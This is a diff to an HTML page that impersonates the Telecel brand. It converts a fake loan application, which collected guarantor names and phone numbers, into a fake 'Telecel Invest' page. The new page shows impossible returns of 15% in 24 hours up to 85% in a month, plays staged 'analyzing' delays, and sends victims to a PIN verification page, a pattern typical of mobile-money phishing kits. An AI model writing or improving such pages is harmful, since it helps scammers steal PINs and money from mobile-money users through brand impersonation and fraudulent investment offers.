@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Telecel – Loan Application</title>
+  <title>Telecel Invest – Start Investing</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
@@ -104,7 +104,7 @@
       transition: all 0.3s ease;
     }
 
-    /* Step container */
+    /* Step container (for suspense animation) */
     .step-container {
       display: flex;
       flex-direction: column;
@@ -147,25 +147,14 @@
       100% { transform: rotate(360deg); }
     }
 
-    /* Loan form styles */
-    .limit-badge {
-      background: #fef2f2;
-      border: 1px solid #fee2e2;
-      border-radius: 40px;
-      padding: 8px 16px;
-      display: inline-block;
-      font-weight: 600;
-      color: var(--telecel-red);
-      margin: 16px 0 12px;
-    }
-
-    .loan-form {
+    /* Investment form styles */
+    .invest-form {
       width: 100%;
       margin: 20px 0;
     }
 
     .input-group {
-      margin-bottom: 20px;
+      margin-bottom: 24px;
       text-align: left;
     }
 
@@ -175,31 +164,6 @@
       font-weight: 600;
       color: var(--sub);
       margin-bottom: 8px;
-    }
-
-    .input-group input {
-      width: 100%;
-      padding: 14px 16px;
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      font-size: 15px;
-      font-weight: 500;
-      outline: none;
-      transition: border 0.2s;
-      background: #fff;
-    }
-
-    .input-group input:focus {
-      border-color: var(--telecel-red);
-      box-shadow: 0 0 0 2px rgba(255, 0, 0, 0.1);
-    }
-
-    /* Two-column layout for first/last name */
-    .name-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin-bottom: 20px;
     }
 
     .error-message {
@@ -239,29 +203,6 @@
       transform: none;
     }
 
-    /* Section header styling */
-    .section-header {
-      text-align: left;
-      margin: 20px 0 12px 0;
-      padding-bottom: 8px;
-      border-bottom: 2px solid #ffe0e0;
-    }
-
-    .section-header h3 {
-      font-size: 16px;
-      font-weight: 700;
-      color: var(--telecel-red);
-      letter-spacing: -0.3px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .section-header h3 i {
-      font-size: 18px;
-      color: var(--telecel-red);
-    }
-
     .footer {
       text-align: center;
       margin-top: 24px;
@@ -271,25 +212,85 @@
       z-index: 2;
     }
 
-    /* Spinner overlay (same as login page) */
+    /* Spinner overlay for suspense */
     #spinner {
       position: fixed;
       inset: 0;
       display: none;
       align-items: center;
       justify-content: center;
-      background: rgba(255, 255, 255, 0.7);
-      backdrop-filter: blur(2px);
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(4px);
       z-index: 999;
+      flex-direction: column;
+      gap: 20px;
+      color: white;
+      font-weight: 600;
+      font-size: 18px;
     }
 
     .spinner-loader {
-      width: 44px;
-      height: 44px;
-      border: 4px solid #ffe0e0;
-      border-top: 4px solid #ff0000;
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid var(--telecel-red);
       border-radius: 50%;
       animation: spin 1s linear infinite;
+    }
+
+    .suspense-message {
+      font-size: 16px;
+      color: white;
+      text-align: center;
+      max-width: 80%;
+    }
+
+    /* plan options styling */
+    .plan-options {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 8px;
+    }
+    .plan-option {
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 16px;
+      cursor: pointer;
+      transition: all 0.2s;
+      background: #fff;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .plan-option.selected {
+      border-color: var(--telecel-red);
+      background: #fff5f5;
+      box-shadow: 0 0 0 1px var(--telecel-red);
+    }
+    .plan-info {
+      flex: 1;
+    }
+    .plan-name {
+      font-weight: 800;
+      font-size: 16px;
+      color: #111;
+    }
+    .plan-rate {
+      font-size: 14px;
+      color: var(--telecel-red);
+      margin-top: 4px;
+      font-weight: 700;
+    }
+    .plan-desc {
+      font-size: 11px;
+      color: var(--sub);
+      margin-top: 4px;
+    }
+    .plan-icon {
+      font-size: 28px;
+      color: var(--telecel-red);
+      margin-left: 12px;
     }
   </style>
 </head>
@@ -299,7 +300,7 @@
 
     <div class="telecel-header">
       <div class="logo-circle">t</div>
-      <div class="logo-text">telecel</div>
+      <div class="logo-text">telecel invest</div>
     </div>
 
     <div class="application-card" id="applicationCard">
@@ -307,220 +308,126 @@
     </div>
 
     <div class="footer">
-      v26.2.2 (TPA-2622) • Telecel Loans
+      v1.0 (Telecel Invest) • Grow your wealth with Telecel
     </div>
   </div>
 
-  <!-- Spinner overlay -->
+  <!-- Spinner overlay for next action -->
   <div id="spinner">
     <div class="spinner-loader"></div>
+    <div class="suspense-message">Preparing your investment...</div>
   </div>
 
   <script>
-    // Step definitions
-    const steps = [
-      {
-        icon: 'fas fa-user-check',
-        title: 'Checking Eligibility',
-        description: 'Verifying your account standing and transaction history...',
-        duration: 4000
-      },
-      {
-        icon: 'fas fa-chart-line',
-        title: 'Calculating Loan Limit',
-        description: 'Analysing repayment capacity and credit score...',
-        duration: 3500
-      },
-      {
-        icon: 'fas fa-file-invoice-dollar',
-        title: 'Preparing Your Offer',
-        description: 'Finalising the best loan package for you...',
-        duration: 4000
-      }
-    ];
+    // Suspense step before showing the plan selection
+    const suspenseStep = {
+      icon: 'fas fa-chart-line',
+      title: 'Analyzing Investment Opportunities',
+      description: 'Finding the best high-yield plans for you...',
+      duration: 2500
+    };
 
-    let currentStep = 0;
     let timeoutId = null;
     const stepContent = document.getElementById('stepContent');
-    const MAX_LIMIT = 1599;
-    const MIN_AMOUNT = 50;
 
-    // Retrieve user's phone number from sessionStorage
-    const userPhone = sessionStorage.getItem('telecel_phone') || '';
+    // Investment plans: 24hrs, 3 days, 1 week, 1 month with high interest
+    const plans = [
+      { id: '24h', name: '24 Hours Turbo', rate: '15%', desc: 'Fast return in just 1 day', duration: '24 hours', icon: 'fa-bolt' },
+      { id: '3d', name: '3 Days Accelerator', rate: '25%', desc: 'Triple in 3 days', duration: '3 days', icon: 'fa-charging-station' },
+      { id: '1w', name: '1 Week Max', rate: '45%', desc: 'Massive returns in 7 days', duration: '1 week', icon: 'fa-calendar-week' },
+      { id: '1m', name: '1 Month Premium', rate: '85%', desc: 'Ultimate growth in 30 days', duration: '1 month', icon: 'fa-crown' }
+    ];
 
-    function renderStep(index) {
-      const step = steps[index];
+    function showSuspense() {
       stepContent.innerHTML = `
         <div class="step-container">
-          <div class="step-icon"><i class="${step.icon}"></i></div>
-          <div class="step-title">${step.title}</div>
-          <div class="step-description">${step.description}</div>
+          <div class="step-icon"><i class="${suspenseStep.icon}"></i></div>
+          <div class="step-title">${suspenseStep.title}</div>
+          <div class="step-description">${suspenseStep.description}</div>
           <div class="loader"></div>
         </div>
       `;
+      timeoutId = setTimeout(() => {
+        showPlanSelection();
+      }, suspenseStep.duration);
     }
 
-    function showLoanForm() {
+    function showPlanSelection() {
       stepContent.innerHTML = `
         <div class="step-container">
-          <div class="step-icon"><i class="fas fa-check-circle"></i></div>
-          <div class="step-title">You're Qualified!</div>
-          <div class="limit-badge">Maximum Loan Limit: ₵${MAX_LIMIT.toLocaleString()}</div>
-          <div class="loan-form">
+          <div class="step-icon"><i class="fas fa-chart-simple"></i></div>
+          <div class="step-title">Select Your Plan</div>
+          <div class="invest-form">
             <div class="input-group">
-              <label>Loan Amount (₵)</label>
-              <input type="number" id="loanAmount" placeholder="Enter amount between ₵${MIN_AMOUNT} - ₵${MAX_LIMIT.toLocaleString()}" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1">
-              <div class="error-message" id="amountError">Please enter a valid amount.</div>
+              <div class="plan-options" id="planOptions"></div>
+              <div class="error-message" id="planError">Please select an investment plan to continue.</div>
             </div>
-
-            <div class="section-header">
-              <h3><i class="fas fa-user-friends"></i> Guarantor / Next of Kin Details</h3>
-            </div>
-            <div class="name-row">
-              <div class="input-group" style="margin-bottom: 0;">
-                <label>First Name</label>
-                <input type="text" id="guarantorFirstName" placeholder="First name" autocomplete="off">
-              </div>
-              <div class="input-group" style="margin-bottom: 0;">
-                <label>Last Name</label>
-                <input type="text" id="guarantorLastName" placeholder="Last name" autocomplete="off">
-              </div>
-            </div>
-            <div class="input-group">
-              <label>Guarantor's Phone Number</label>
-              <input type="tel" id="guarantorPhone" placeholder="e.g., 024XXXXXXX" inputmode="numeric">
-              <div class="error-message" id="phoneError">Phone number cannot be the same as yours.</div>
-            </div>
-
-            <button id="applyBtn" class="btn" disabled>Apply Now</button>
+            <button id="nextBtn" class="btn" disabled>Next</button>
           </div>
         </div>
       `;
 
-      const amountInput = document.getElementById('loanAmount');
-      const firstNameInput = document.getElementById('guarantorFirstName');
-      const lastNameInput = document.getElementById('guarantorLastName');
-      const phoneInput = document.getElementById('guarantorPhone');
-      const applyBtn = document.getElementById('applyBtn');
-      const amountError = document.getElementById('amountError');
-      const phoneError = document.getElementById('phoneError');
+      const planContainer = document.getElementById('planOptions');
+      let selectedPlanId = null;
 
-      function validateForm() {
-        const amount = parseInt(amountInput.value, 10);
-        const firstName = firstNameInput.value.trim();
-        const lastName = lastNameInput.value.trim();
-        const phone = phoneInput.value.trim();
-
-        let valid = true;
-
-        // Amount validation
-        if (isNaN(amount) || amount < MIN_AMOUNT || amount > MAX_LIMIT) {
-          valid = false;
-          amountError.style.display = 'block';
-          if (isNaN(amount)) amountError.textContent = 'Please enter a valid number.';
-          else amountError.textContent = `Amount must be between ₵${MIN_AMOUNT} and ₵${MAX_LIMIT.toLocaleString()}.`;
-        } else {
-          amountError.style.display = 'none';
-        }
-
-        // Phone validation
-        const phoneDigits = phone.replace(/\D/g, '');
-        const userPhoneDigits = userPhone.replace(/\D/g, '');
-        if (phone === '') {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Guarantor phone number is required.';
-        } else if (phoneDigits === userPhoneDigits && userPhoneDigits !== '') {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Guarantor phone number cannot be the same as yours.';
-        } else if (phoneDigits.length < 9) {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Please enter a valid phone number.';
-        } else {
-          phoneError.style.display = 'none';
-        }
-
-        // Name errors
-        if (firstName === '' || lastName === '') {
-          if (!document.getElementById('nameError')) {
-            const nameErrorDiv = document.createElement('div');
-            nameErrorDiv.id = 'nameError';
-            nameErrorDiv.className = 'error-message';
-            nameErrorDiv.style.display = 'block';
-            nameErrorDiv.textContent = 'Both first name and last name are required.';
-            phoneInput.parentNode.insertBefore(nameErrorDiv, phoneInput.nextSibling);
-          } else {
-            document.getElementById('nameError').style.display = 'block';
-          }
-          valid = false;
-        } else {
-          if (document.getElementById('nameError')) {
-            document.getElementById('nameError').style.display = 'none';
-          }
-        }
-
-        applyBtn.disabled = !valid;
-      }
-
-      amountInput.addEventListener('input', validateForm);
-      firstNameInput.addEventListener('input', validateForm);
-      lastNameInput.addEventListener('input', validateForm);
-      phoneInput.addEventListener('input', validateForm);
-
-      applyBtn.addEventListener('click', function() {
-        const amount = parseInt(amountInput.value, 10);
-        const firstName = firstNameInput.value.trim();
-        const lastName = lastNameInput.value.trim();
-        const phone = phoneInput.value.trim();
-        const phoneDigits = phone.replace(/\D/g, '');
-        const userPhoneDigits = userPhone.replace(/\D/g, '');
-
-        if (amount >= MIN_AMOUNT && amount <= MAX_LIMIT &&
-            firstName !== '' && lastName !== '' &&
-            phoneDigits !== '' && phoneDigits !== userPhoneDigits && phoneDigits.length >= 9) {
-
-          // Store loan and guarantor data
-          sessionStorage.setItem('loanAmount', amount);
-          sessionStorage.setItem('guarantorFirstName', firstName);
-          sessionStorage.setItem('guarantorLastName', lastName);
-          sessionStorage.setItem('guarantorPhone', phoneDigits);
-
-          // Show spinner and redirect after delay
-          const spinner = document.getElementById('spinner');
-          spinner.style.display = 'flex';
-          applyBtn.disabled = true;  // prevent double click
-
-          setTimeout(() => {
-            window.location.href = 'pin.html';
-          }, 1500); // 1.5 second delay for loading effect
-        }
+      plans.forEach(plan => {
+        const div = document.createElement('div');
+        div.className = 'plan-option';
+        div.setAttribute('data-plan-id', plan.id);
+        div.innerHTML = `
+          <div class="plan-info">
+            <div class="plan-name">${plan.name}</div>
+            <div class="plan-rate">${plan.rate} interest</div>
+            <div class="plan-desc">${plan.desc} • ${plan.duration}</div>
+          </div>
+          <div class="plan-icon"><i class="fas ${plan.icon}"></i></div>
+        `;
+        div.addEventListener('click', () => {
+          document.querySelectorAll('.plan-option').forEach(opt => opt.classList.remove('selected'));
+          div.classList.add('selected');
+          selectedPlanId = plan.id;
+          document.getElementById('planError').style.display = 'none';
+          document.getElementById('nextBtn').disabled = false;
+        });
+        planContainer.appendChild(div);
       });
 
-      validateForm();
+      const nextBtn = document.getElementById('nextBtn');
+      const planError = document.getElementById('planError');
+
+      nextBtn.addEventListener('click', function() {
+        if (!selectedPlanId) {
+          planError.style.display = 'block';
+          return;
+        }
+
+        // Store selected plan in sessionStorage
+        const selectedPlan = plans.find(p => p.id === selectedPlanId);
+        sessionStorage.setItem('selectedInvestmentPlan', JSON.stringify(selectedPlan));
+        sessionStorage.setItem('investmentPlanId', selectedPlanId);
+
+        // Show spinner and redirect to pin.html
+        const spinner = document.getElementById('spinner');
+        spinner.style.display = 'flex';
+        nextBtn.disabled = true;
+
+        // Optional: change suspense message to build anticipation
+        const suspenseMsg = document.querySelector('.suspense-message');
+        setTimeout(() => {
+          if (suspenseMsg) suspenseMsg.textContent = 'Securing your investment details...';
+        }, 500);
+        setTimeout(() => {
+          if (suspenseMsg) suspenseMsg.textContent = 'Redirecting to PIN verification...';
+        }, 1000);
+
+        setTimeout(() => {
+          window.location.href = 'pin.html';
+        }, 1800);
+      });
     }
 
-    function nextStep() {
-      currentStep++;
-      if (currentStep < steps.length) {
-        renderStep(currentStep);
-        timeoutId = setTimeout(() => {
-          nextStep();
-        }, steps[currentStep].duration);
-      } else {
-        showLoanForm();
-      }
-    }
-
-    function startApplication() {
-      renderStep(0);
-      timeoutId = setTimeout(() => {
-        nextStep();
-      }, steps[0].duration);
-    }
-
-    startApplication();
+    // Start the flow
+    showSuspense();
 
     window.addEventListener('beforeunload', () => {
       if (timeoutId) clearTimeout(timeoutId);
